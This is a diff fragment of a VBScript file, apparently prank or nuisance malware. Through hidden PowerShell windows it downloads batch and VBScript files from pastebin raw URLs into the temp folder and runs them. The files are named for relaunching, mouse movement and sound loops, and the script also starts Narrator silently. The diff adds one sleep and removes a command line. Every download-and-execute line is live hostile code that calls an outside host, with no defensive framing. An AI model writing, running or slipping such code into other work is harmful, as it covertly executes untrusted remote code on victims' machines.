@@ -20,11 +20,8 @@ WshShell.Run "narrator", 0, False
 WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/TiNThhxW','%TEMP%\relaunchping.bat'); Start-Process '%TEMP%\relaunchping.bat'""", 0, False
 WScript.Sleep 1200
 
-WshShell.Run moveCmd, 0, False
-
-WScript.Sleep 1200
-
 WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/NfhDWkdS','%TEMP%\mousemove.vbs'); Start-Process '%TEMP%\mousemove.vbs'""", 0, False
+WScript.Sleep 500
 
 WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/tLYqCwJQ','%TEMP%\soundloop.vbs')""", 0, True
 WshShell.Run "wscript.exe %TEMP%\soundloop.vbs", 0, False
